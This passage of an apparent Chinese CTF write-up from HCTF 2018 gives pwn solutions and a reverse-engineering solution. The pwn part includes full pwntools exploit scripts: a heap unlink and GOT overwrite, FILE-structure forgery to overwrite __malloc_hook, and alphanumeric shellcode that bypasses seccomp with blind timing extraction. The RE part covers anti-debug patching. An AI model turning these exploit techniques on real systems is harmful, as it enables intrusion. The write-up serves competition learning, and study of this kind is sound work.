class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">    ru(<span class="string">'Input your token:'</span>)</span><br><span class="line">    sl(<span class="string">'uvm73jg2AFMECo71DIZRZh39MRqFOI2w'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input your home's name: "</span>)</span><br><span class="line">se(<span class="string">'(unreachable)\n'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'$'</span>)</span><br><span class="line">mkfile(<span class="string">'(unreachable)/tmp'</span>,<span class="string">'a'</span>*<span class="number">0x16</span>+<span class="string">'/'</span>)</span><br><span class="line">mkfile(<span class="string">'2'</span>,<span class="string">'a'</span>*<span class="number">0x27</span>)</span><br><span class="line">mkfile(<span class="string">'3'</span>,<span class="string">'a'</span>*<span class="number">0x37</span>)</span><br><span class="line">mkfile(<span class="string">'3'</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'mkdir ../../../../a\x41'</span>)</span><br><span class="line">cat(<span class="string">'(unreachable)/tmp'</span>)</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'4'</span>,<span class="string">'a'</span>*<span class="number">0x37</span>)</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'4'</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6031e0</span><span class="number">-0x18</span>+<span class="number">1</span>)+p64(<span class="number">0x6031e0</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'5'</span>,<span class="string">'1'</span>*<span class="number">0x27</span>)</span><br><span class="line">cat(<span class="string">'4'</span>)</span><br><span class="line">mkfile(<span class="string">'6'</span>,<span class="string">'a'</span>*<span class="number">0x37</span>)</span><br><span class="line">mkfile(<span class="string">'6'</span>,p64(<span class="number">0x21</span>)*<span class="number">6</span>)</span><br><span class="line">mkfile(<span class="string">'7'</span>,<span class="string">'a'</span>*<span class="number">0x37</span>)</span><br><span class="line">mkfile(<span class="string">'7'</span>,p64(<span class="number">0x21</span>)*<span class="number">6</span>)</span><br><span class="line">cat(<span class="string">'6'</span>)</span><br><span class="line">mkfile(<span class="string">'77'</span>,<span class="string">'a'</span>*<span class="number">0x27</span>)</span><br><span class="line">mkfile(<span class="string">'77'</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'4'</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6031e0</span><span class="number">-0x18</span>)+p64(<span class="number">0x6031e0</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'8'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'4'</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x603180</span>)+p32(<span class="number">0x200</span>)[:<span class="number">2</span>])</span><br><span class="line">mkfile(<span class="string">'4'</span>,p64(<span class="number">0x603018</span>)+p32(<span class="number">0x200</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">data=cat(<span class="string">'77'</span>)</span><br><span class="line">base=u64(data[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">'\x00\x00'</span>)-e.symbols[<span class="string">'free'</span>]</span><br><span class="line">system = base+e.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'77'</span>,p64(system)[:<span class="number">6</span>])</span><br><span class="line">cat(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'mkfile 99'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><code>flag:hctf{53e3b00dc29b152d1740f042ae4efce199785f7acaa062c21d600e67f811d276}</code></p></blockquote><h2><span id="baby-printf-ver2">baby printf ver2</span></h2><p>首先利用任意读把libc地址泄漏出来， 然后任意写，写<code>__malloc_hook</code> 再输入<code>%n</code>，报错，报错的时候会调用malloc，get shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p=process('./babyprintf_ver2')</span></span><br><span class="line">    p=process(<span class="string">'./babyprintf_ver2'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc64.so'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'150.109.44.250'</span>, <span class="number">20005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">    ru(<span class="string">'Input your token:'</span>)</span><br><span class="line">    se(<span class="string">'uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'So I change the buffer location to '</span>)</span><br><span class="line"></span><br><span class="line">buffer=int(ru(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">pbase=buffer<span class="number">-0x202010</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Have fun!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = p64(<span class="number">0xfbad2887</span>) + p64(pbase+<span class="number">0x201FB0</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0xf0</span>) +p64(buffer+<span class="number">0xf0</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0xf0</span>) +p64(buffer+<span class="number">0xf8</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0xf0</span>) +p64(pbase+<span class="number">0x201FB0</span>)</span><br><span class="line">file+= p64(pbase+<span class="number">0x201FB0</span>+<span class="number">8</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">1</span>) +p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(buffer+<span class="number">0x200</span>)</span><br><span class="line">file+= p64(<span class="number">0xffffffffffffffff</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0x210</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0x00000000ffffffff</span>)+p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(buffer+<span class="number">0x18</span>)+file+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'permitted!\n'</span>)</span><br><span class="line">libc=u64(ru(<span class="string">'\x00\x00'</span>))</span><br><span class="line"></span><br><span class="line">base=libc<span class="number">-0x3E82A0</span></span><br><span class="line"></span><br><span class="line">malloc_hook=base+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">file = p64(<span class="number">0xfbad2887</span>) + p64(malloc_hook)</span><br><span class="line">file+= p64(malloc_hook) +p64(malloc_hook)</span><br><span class="line">file+= p64(malloc_hook) +p64(malloc_hook)</span><br><span class="line">file+= p64(malloc_hook+<span class="number">8</span>) +p64(pbase+<span class="number">0x201FB0</span>)</span><br><span class="line">file+= p64(pbase+<span class="number">0x201FB0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">1</span>) +p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(buffer+<span class="number">0x220</span>)</span><br><span class="line">file+= p64(<span class="number">0xffffffffffffffff</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0x230</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0x00000000ffffffff</span>)+p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(p64(base+<span class="number">0x4f322</span>)*<span class="number">2</span>+p64(buffer+<span class="number">0x18</span>)+file+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'%n\n'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(pbase))</span><br><span class="line">print(hex(libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="christmas">christmas</span></h2><p>写shellcode，有seccomp</p><p>seccomp 限制了只能执行exit和exit_group 这两个syscall</p><p>还限制了只能字母和数字，这个限制可以用alpha3突破（非灰也师傅帮忙修好了，能在linux下面跑</p><p>程序没开pie，因此能在程序那里拿到libc的地址，然后找libc base</p><p>base找到了之后，倒着去搜libflag.so里面bss段的_DYNAMIC</p><p>在里面可以找到DT_STRTAB和DT_SYMTAB，然后搜flag_yes_1337，根据偏移再找到 Elf64_Sym 结构体，最后找到flag_yes_1337函数的地址，call一下拿到flag，然后再盲注出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pwnlib.shellcraft.amd64 <span class="keyword">as</span> sc</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload=asm(sc.mov(<span class="string">'rdi'</span>,<span class="number">0x602030</span>))+\</span><br><span class="line">asm(<span class="string">"mov rdi,[rdi]"</span>) +\</span><br><span class="line">asm(sc.mov(<span class="string">'rdx'</span>,<span class="number">0x6f690</span>)) +\</span><br><span class="line">asm(<span class="string">'sub rdi,rdx'</span>)+ \</span><br><span class="line">asm(sc.mov(<span class="string">'rbx'</span>,<span class="string">'rdi'</span>)) +\</span><br><span class="line">asm(sc.push(<span class="number">0x6FFFFEF5</span>))+\</span><br><span class="line">asm(<span class="string">'''</span></span><br><span class="line"><span class="string">search:</span></span><br><span class="line"><span class="string">    push 4</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    mov rdi,rbx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    repe cmpsb</span></span><br><span class="line"><span class="string">    jz  done</span></span><br><span class="line"><span class="string">    sub rbx,1</span></span><br><span class="line"><span class="string">    jnz search </span></span><br><span class="line"><span class="string">done: </span></span><br><span class="line"><span class="string">'''</span>)+\</span><br><span class="line">asm(<span class="string">'add rdi,0x14'</span>)+\</span><br><span class="line">asm(<span class="string">'mov r10,[rdi]'</span>)+\</span><br><span class="line">asm(<span class="string">'add rdi,0x10'</span>)+\</span><br><span class="line">asm(<span class="string">'mov r11,[rdi]'</span>)+\</span><br><span class="line">asm(<span class="string">'sub rdi,0x40'</span>)+\</span><br><span class="line">asm(<span class="string">'mov rcx,[rdi]'</span>)+\</span><br><span class="line">asm(<span class="string">'sub rbx,rcx'</span>)+\</span><br><span class="line">asm(sc.mov(<span class="string">'rcx'</span>,<span class="number">0x80</span>))+\</span><br><span class="line">asm(<span class="string">'sub rbx,rcx'</span>)+\</span><br><span class="line">asm(<span class="string">'mov r12,rbx'</span>)+\</span><br><span class="line">asm(sc.pushstr(<span class="string">'flag_yes_'</span>))+\</span><br><span class="line">asm(<span class="string">'mov rbx,r10'</span>)+\</span><br><span class="line">asm(<span class="string">'''</span></span><br><span class="line"><span class="string">search:</span></span><br><span class="line"><span class="string">    push 8</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    mov rdi,rbx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    repe cmpsb</span></span><br><span class="line"><span class="string">    jz  done</span></span><br><span class="line"><span class="string">    add rbx,1</span></span><br><span class="line"><span class="string">    jnz search </span></span><br><span class="line"><span class="string">done: </span></span><br><span class="line"><span class="string">'''</span>)+\</span><br><span class="line">asm(<span class="string">'sub rdi,0x8'</span>)+\</span><br><span class="line">asm(<span class="string">'sub rdi,r10'</span>)+\</span><br><span class="line">asm(<span class="string">'push rdi'</span>)+\</span><br><span class="line">asm(<span class="string">'mov rbx,r11'</span>)+\</span><br><span class="line">asm(<span class="string">'''</span></span><br><span class="line"><span class="string">search:</span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    mov rdi,rbx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    repe cmpsb</span></span><br><span class="line"><span class="string">    jz  done</span></span><br><span class="line"><span class="string">    add rbx,1</span></span><br><span class="line"><span class="string">    jnz search </span></span><br><span class="line"><span class="string">done: </span></span><br><span class="line"><span class="string">'''</span>)+\</span><br><span class="line">asm(<span class="string">'add rdi,5'</span>)+\</span><br><span class="line">asm(<span class="string">'mov rdi,[rdi]'</span>)+\</span><br><span class="line">asm(<span class="string">'add rdi,r12'</span>)+\</span><br><span class="line">asm(<span class="string">'call rdi'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">    tmp=payload+\</span><br><span class="line">    asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    add al,%d</span></span><br><span class="line"><span class="string">    xor rbx,rbx</span></span><br><span class="line"><span class="string">    xor rcx,rcx</span></span><br><span class="line"><span class="string">    mov bl,[rax]</span></span><br><span class="line"><span class="string">    add cl,%d</span></span><br><span class="line"><span class="string">    cmp rbx,rcx</span></span><br><span class="line"><span class="string">    jz done</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    add al,60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    done:</span></span><br><span class="line"><span class="string">    '''</span>%(idx,c))+asm(sc.infloop())</span><br><span class="line"></span><br><span class="line">    print(idx,c)</span><br><span class="line">    f=open(<span class="string">'alapayload'</span>,<span class="string">'wb'</span>)</span><br><span class="line">    f.write(tmp)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">    debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#context.log_level='debug'</span></span><br><span class="line">    context.arch=<span class="string">'amd64'</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p=process(<span class="string">'./christmas'</span>)</span><br><span class="line">        <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">'150.109.46.159'</span>, <span class="number">20003</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">        p.send(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">        ru(<span class="string">'Input your token:'</span>)</span><br><span class="line">        se(<span class="string">'uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n'</span>)</span><br><span class="line">    payload=<span class="string">'42'</span></span><br><span class="line">    generate(idx,c)</span><br><span class="line">    a=os.popen(<span class="string">'python ./alpha3/ALPHA3.py x64 ascii mixedcase RAX --input="alapayload"'</span>)</span><br><span class="line">    payload+=a.read()</span><br><span class="line">    a.close()</span><br><span class="line">    se(payload)</span><br><span class="line">    ru(<span class="string">'can you tell me how to find it??'</span>)</span><br><span class="line">    start=time.time()</span><br><span class="line">    p.can_recv_raw(timeout=<span class="number">3</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    end=time.time()</span><br><span class="line">    <span class="keyword">if</span> end-start&gt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str=<span class="string">'&#123;&#125;_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+!@#$%^&amp;*()'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#brute(4,ord('&#123;'))</span></span><br><span class="line">flag=<span class="string">'&#123;dyn_15_4w'</span></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">14</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        <span class="keyword">if</span> brute(q,ord(str[i])):</span><br><span class="line">            raw_input(str[i])</span><br><span class="line">            flag+=str[i]</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Pwn/christmas_00.png"></p><blockquote><p><code>flag:HCTF{dyn_15_4w350m3}</code></p></blockquote><h1><span id="re">RE</span></h1><h2><span id="lucky-star">Lucky star</span></h2><p>找main函数，发现是smc过的，找找其他地方 0040155D和004015CA 调用了了一个反调试函数，把参数0x11改成0 00403148有一段进程名的字符串，全改成0 0040251b调用了另一个反调试函数，把下方的00402521的jz改成jmp 全部改完打个补丁，程序就能正常运行了。 在调用main函数的地方00401C20设下断点，开始调试，断下的时候main函数就解析好了 先播放了一段音频，中间还有sleep，大概一分钟，不相等可以直接把那一段的cmp jz改成cmp jmp</p><p>004015E0是加密函数 加密算法如下： 先把输入进行base64加密 a2位base64加密完的 它的base64大小写是反的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v14=<span class="number">0</span></span><br><span class="line">v19 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="keyword">if</span> ( v19 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = <span class="number">6</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = rand() % <span class="number">4</span>;</span><br><span class="line">        v18 = v16;</span><br><span class="line">        v16 -= <span class="number">2</span>;</span><br><span class="line">        result = (_BYTE)v17 &lt;&lt; v18;</span><br><span class="line">        a2[v14] ^= result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v16 &gt; <span class="number">-2</span> );</span><br><span class="line">      ++v14;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v14 &lt; v19 );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到，他对每一个字符异或了四个随机数（先对随机数进行了一些操作），在异或的地方设下条件记录断点，记录下异或的数据，然后反向解密就行了。</p><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secret=[<span class="number">0x49</span>,<span class="number">0xE6</span>,<span class="number">0x57</span>,<span class="number">0xBD</span>,<span class="number">0x3A</span>,<span class="number">0x47</span>,<span class="number">0x11</span>,<span class="number">0x4C</span>,<span class="number">0x95</span>,<span class="number">0xBC</span>,<span class="number">0xEE</span>,<span class="number">0x32</span>,<span class="number">0x72</span>,<span class="number">0xA0</span>,<span class="number">0xF0</span>,<span class="number">0xDE</span>,<span class="number">0xAC</span>,<span class="number">0xF2</span>,<span class="number">0x83</span>,<span class="number">0x56</span>,<span class="number">0x83</span>,<span class="number">0x49</span>,<span class="number">0x6E</span>,<span class="number">0xA9</span>,<span class="number">0xA6</span>,<span class="number">0xC5</span>,<span class="number">0x67</span>,<span class="number">0x3C</span>,<span class="number">0xCA</span>,<span class="number">0xC8</span>,<span class="number">0xCC</span>,<span class="number">0x05</span>]</span><br><span class="line">xor=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">128</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">192</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">128</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">128</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">128</span>,<span class="number">48</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">192</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">192</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">192</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">128</span>,<span class="number">48</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">64</span>,<span class="number">16</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">64</span>,<span class="number">32</span>,<span 